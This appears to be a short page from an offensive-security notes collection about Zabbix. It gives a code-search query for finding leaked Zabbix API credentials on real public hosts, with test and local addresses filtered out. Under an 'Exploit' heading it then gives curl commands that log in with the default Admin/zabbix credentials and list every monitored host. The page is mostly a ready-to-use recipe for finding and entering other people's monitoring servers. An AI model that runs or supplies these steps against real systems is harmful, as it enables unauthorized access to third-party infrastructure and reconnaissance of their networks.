---
description: >-
  Zabbix is a mature and effortless enterprise-class open source monitoring
  solution for network monitoring and application monitoring of millions of
  metrics.
---

# Zabbix

## Search

```
zabbix/api_jsonrpc.php AND "user" AND "password" AND  /https?:\/\/[^\/\s]+\.*\.com/ NOT localhost NOT 192.168. NOT 127.0.0.1 NOT example NOT demo NOT domain.com
```

## Exploit

Get Api token

```
curl -X POST -H "Content-Type: application/json" -d '
{
    "jsonrpc": "2.0",
    "method": "user.login",
    "params": {
        "user": "Admin",
        "password": "zabbix"
    },
    "id": 1,
    "auth": null
}' http://<Zabbix_Server_IP>/zabbix/api_jsonrpc.php
```

Get all host

```
curl -X POST -H "Content-Type: application/json" -d '
{
    "jsonrpc": "2.0",
    "method": "host.get",
    "params": {
        "output": "extend"
    },
    "auth": "e0f5243a02a1234567b2adfe188b5e76",
    "id": 1
}' http://<Zabbix_Server_IP>/zabbix/api_jsonrpc.php
```
